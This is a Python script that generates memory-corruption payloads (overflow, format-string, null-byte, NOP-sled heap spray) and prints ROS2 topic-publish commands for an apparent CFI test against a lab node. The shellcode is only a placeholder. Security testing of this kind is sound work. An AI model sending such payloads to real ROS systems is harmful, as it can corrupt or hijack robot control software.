#!/usr/bin/env python3
# generate_payload.py - 다양한 공격 페이로드 생성

import sys

def generate_overflow_payload(size=128, pattern='A'):
    """Buffer overflow 페이로드 생성"""
    return f"OVERFLOW:{pattern * size}"

def generate_format_string():
    """Format string 공격 페이로드"""
    return "OVERFLOW:%x.%x.%x.%x.%x.%x.%x.%x"

def generate_null_injection():
    """Null byte injection"""
    return "OVERFLOW:data\x00corrupted"

def generate_heap_spray():
    """Heap spray 패턴"""
    # NOP sled + shellcode placeholder
    nop_sled = "\x90" * 64
    fake_addr = "\x41\x41\x41\x41" * 8
    return f"OVERFLOW:{nop_sled}{fake_addr}"

def print_payloads():
    """다양한 페이로드 출력"""
    print("=== ROS2 CFI Attack Payloads ===\n")
    
    print("1. Simple Buffer Overflow (128 A's):")
    print(f"   ros2 topic pub --once /attack_topic std_msgs/msg/String \"data: '{generate_overflow_payload()}'\"")
    print()
    
    print("2. Pattern Overflow (for debugging):")
    payload = "OVERFLOW:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9"
    print(f"   ros2 topic pub --once /attack_topic std_msgs/msg/String \"data: '{payload}'\"")
    print()
    
    print("3. Hex Pattern (0x41414141...):")
    hex_pattern = "OVERFLOW:" + "\\x41" * 100
    print(f"   echo -e '{hex_pattern}' | ros2 topic pub --once /attack_topic std_msgs/msg/String \"data: '-'\"")
    print()
    
    print("4. Incremental Test (find exact overflow point):")
    for size in [32, 64, 96, 128, 256]:
        print(f"   # Size {size}: ros2 topic pub --once /attack_topic std_msgs/msg/String \"data: 'OVERFLOW:{'B'*size}'\"")
    print()
    
    print("5. Combined Attack Sequence:")
    print("   # Step 1: Register subscription")
    print("   ros2 topic pub --once /attack_topic std_msgs/msg/String \"data: 'INIT'\"")
    print("   sleep 1")
    print("   # Step 2: Corrupt memory")
    print(f"   ros2 topic pub --once /attack_topic std_msgs/msg/String \"data: '{generate_overflow_payload(150)}'\"")
    print("   sleep 1")
    print("   # Step 3: Trigger CFI check")
    print("   ros2 topic pub --once /attack_topic std_msgs/msg/String \"data: 'TRIGGER'\"")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        size = int(sys.argv[1])
        print(generate_overflow_payload(size))
    else:
        print_payloads()
